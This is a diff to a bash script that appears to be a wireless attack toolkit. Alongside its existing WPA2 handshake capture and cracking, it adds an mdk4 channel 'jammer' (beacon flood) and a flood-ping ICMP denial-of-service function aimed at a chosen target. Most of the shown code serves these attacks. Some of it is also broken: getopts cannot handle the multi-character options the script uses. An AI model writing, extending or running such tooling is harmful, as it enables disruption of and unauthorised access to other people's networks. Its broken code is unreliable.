@@ -21,10 +21,14 @@ HANDSHAKE_FILE="/tmp/handshake.pcap"
 SCAN_DURATION=60
 FLOOD_COUNT=100
 MAC_FLOOD_COUNT=100
+JAMMER_FREQ="2400"
+JAMMER_DURATION="60"
+ICMP_FLOOD_COUNT=1000
+ICMP_TARGET=""
 
 # Check if necessary tools are installed
 check_dependencies() {
-    dependencies=(iw ifconfig ip tshark aireplay-ng hostapd aircrack-ng airodump-ng hcxdumptool hcxpcapngtool)
+    dependencies=(iw ifconfig ip tshark aireplay-ng hostapd aircrack-ng airodump-ng hcxdumptool hcxpcapngtool mdk4)
     for cmd in "${dependencies[@]}"; do
         if ! command -v "$cmd" &>/dev/null; then
             echo "Error: $cmd is not installed. Exiting..."
@@ -150,6 +154,22 @@ crack_wpa2_hcxpcapngtool() {
     aircrack-ng /tmp/cracked_hashes.hccapx -w $WORDLIST_FILE
 }
 
+# Perform jammer attack on specific channel
+jammer_attack() {
+    if [ -z "$CHANNEL" ]; then
+        exit 1
+    fi
+    mdk4 $INTERFACE b -c $CHANNEL -t $JAMMER_FREQ -d $JAMMER_DURATION
+}
+
+# Perform ICMP flood attack on a target
+icmp_flood() {
+    if [ -z "$ICMP_TARGET" ]; then
+        exit 1
+    fi
+    ping $ICMP_TARGET -f -c $ICMP_FLOOD_COUNT
+}
+
 # Display available options in help message
 display_help() {
     echo "███████╗██████╗░██╗░█████╗░██████╗░██████╗░"
@@ -180,13 +200,15 @@ display_help() {
     echo "  -h              Display this help message"
     echo "  -chc            Capture WPA2 handshake using hcxdumptool"
     echo "  -wcrack         Crack WPA2 using hcxpcapngtool"
+    echo "  -jam            Perform jammer attack on a channel"
+    echo "  -icmp           Perform ICMP flood attack"
 }
 
 # Main function to parse command line arguments
 main() {
     check_dependencies
 
-    while getopts "sdfc:w:r:m:mf:hch" opt; do
+    while getopts "sdfc:w:r:m:mf:hchjam:icmp:" opt; do
         case $opt in
             s)
                 scan_networks
@@ -225,6 +247,14 @@ main() {
             wcrack)
                 WORDLIST_FILE=$OPTARG
                 crack_wpa2_hcxpcapngtool
+                ;;
+            jam)
+                read -p "Enter channel for jammer attack: " CHANNEL
+                jammer_attack
+                ;;
+            icmp)
+                ICMP_TARGET=$OPTARG
+                icmp_flood
                 ;;
             h)
                 display_help
